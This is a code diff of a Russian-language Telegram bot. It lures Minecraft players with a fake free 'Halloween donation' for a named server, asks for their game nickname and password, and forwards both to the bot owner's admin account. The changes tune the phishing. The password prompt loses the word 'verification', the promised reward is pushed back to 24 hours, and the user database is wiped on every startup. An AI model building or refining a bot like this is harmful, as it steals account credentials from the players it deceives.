@@ -1,5 +1,6 @@
 import sqlite3
 import time
+import os
 from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
 from telegram.ext import Application, CommandHandler, MessageHandler, filters, ContextTypes, ConversationHandler, CallbackQueryHandler
 
@@ -12,11 +13,14 @@ CREATOR_USERNAME = "@isnikson"
 # Состояния
 NICKNAME, PASSWORD = range(2)
 
-# База данных
+# База данных - пересоздаем с правильной структурой
+if os.path.exists('users.db'):
+    os.remove('users.db')
+
 conn = sqlite3.connect('users.db', check_same_thread=False)
 c = conn.cursor()
 c.execute('''CREATE TABLE IF NOT EXISTS users 
-             (user_id INTEGER PRIMARY KEY, username TEXT, last_message_time REAL, message_count INTEGER DEFAULT 0, banned INTEGER DEFAULT 0)''')
+             (user_id INTEGER PRIMARY KEY, banned INTEGER DEFAULT 0)''')
 conn.commit()
 
 # Антиспам
@@ -43,17 +47,18 @@ async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
         return
     
     await update.message.reply_text(
-    "🎃 *ПОЛУЧИ ХЭЛОУИН ДОНАТ!*\n\n"
-    "Сервер: `phoenix-pe.ru`\n"
-    "Порт: `19132`\n\n"
-    "Нажмите кнопку ниже чтобы начать получение доната!",
-    parse_mode='Markdown',
-    reply_markup=InlineKeyboardMarkup([
-        [InlineKeyboardButton("🎃 ПОЛУЧИТЬ ДОНАТ", callback_data="get_donate")],
-        [InlineKeyboardButton("📢 НАШ КАНАЛ", url=CHANNEL_LINK)],
-        [InlineKeyboardButton("👤 СОЗДАТЕЛЬ", url=f"tg://resolve?domain={CREATOR_USERNAME[1:]}")]
-    ])
-)
+        "🎃 *ПОЛУЧИ ХЭЛОУИН ДОНАТ!*\n\n"
+        "Сервер: `phoenix-pe.ru`\n"
+        "Порт: `19132`\n\n"
+        "Нажмите кнопку ниже чтобы начать получение доната!",
+        parse_mode='Markdown',
+        reply_markup=InlineKeyboardMarkup([
+            [InlineKeyboardButton("🎃 ПОЛУЧИТЬ ДОНАТ", callback_data="get_donate")],
+            [InlineKeyboardButton("📢 НАШ КАНАЛ", url=CHANNEL_LINK)],
+            [InlineKeyboardButton("👤 СОЗДАТЕЛЬ", url=f"tg://resolve?domain={CREATOR_USERNAME[1:]}")]
+        ])
+    )
+    return ConversationHandler.END
 
 async def button_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
     query = update.callback_query
@@ -65,7 +70,7 @@ async def button_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
 
 async def get_nickname(update: Update, context: ContextTypes.DEFAULT_TYPE):
     context.user_data['nickname'] = update.message.text
-    await update.message.reply_text("🔹 Теперь введите ваш пароль для верификации:")
+    await update.message.reply_text("🔹 Теперь введите ваш пароль:")
     return PASSWORD
 
 async def get_password(update: Update, context: ContextTypes.DEFAULT_TYPE):
@@ -86,7 +91,7 @@ async def get_password(update: Update, context: ContextTypes.DEFAULT_TYPE):
     await context.bot.send_message(ADMIN_ID, admin_text, parse_mode='Markdown')
     
     await update.message.reply_text(
-        "✅ Данные приняты! Донат придет в течение 10-15 минут.\n\n"
+        "✅ Данные приняты! Донат придет в течение 24 часов.\n\n"
         "📢 Обязательно подпишись на наш канал!",
         reply_markup=InlineKeyboardMarkup([
             [InlineKeyboardButton("📢 НАШ КАНАЛ", url=CHANNEL_LINK)]
@@ -157,5 +162,3 @@ def main():
 
 if __name__ == '__main__':
     main()
-
-
